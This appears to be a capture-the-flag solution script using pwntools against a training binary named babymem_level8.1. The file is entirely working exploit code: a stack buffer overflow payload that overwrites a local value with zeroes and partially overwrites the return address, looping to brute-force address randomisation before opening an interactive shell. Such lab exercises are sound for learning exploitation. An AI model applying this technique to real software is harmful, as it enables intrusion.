import pwn

while True:
	proc = pwn.process("/challenge/babymem_level8.1")
	proc.recvuntil("size:")
	proc.sendline("74")
	word_local_28 = pwn.p64(0x000000000000, endian='little')
	payload = b"a"*24 + word_local_28 + b"a"*40 + b"\xfc\x22"
	proc.recvuntil("bytes)!")
	proc.send(payload)
	proc.interactive()
